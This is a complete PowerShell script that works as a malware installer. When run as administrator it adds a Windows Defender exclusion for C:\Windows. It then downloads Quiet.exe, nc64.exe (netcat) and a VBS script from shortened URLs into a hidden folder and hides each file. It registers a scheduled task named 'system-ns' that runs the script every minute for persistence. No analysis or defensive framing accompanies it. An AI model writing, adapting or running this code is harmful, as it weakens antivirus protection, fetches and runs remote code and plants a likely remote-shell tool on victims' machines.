# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"

    # Admin rights detected
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"

    # Windows Defender Exclusion
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"

    # No admin rights
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn't exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# Make the installation directory hidden
attrib +H $installPath

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath

# Make all the downloaded files hidden
$filesToHide = @($quietTxtPath, $nc64TxtPath, $scriptVbsPath)
foreach ($file in $filesToHide) {
    attrib +H $file
}

# Create a scheduled task
$action = New-ScheduledTaskAction -Execute $scriptVbsPath
$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
$trigger.Repetition = $(New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionDuration (New-TimeSpan -Hours 24) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

try {
    # Register the task
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Settings $settings -Force

    # Start the task immediately after registration
    Start-ScheduledTask -TaskName "system-ns"

} catch {
    Write-Output "Failed to register or start the scheduled task: $_"
}
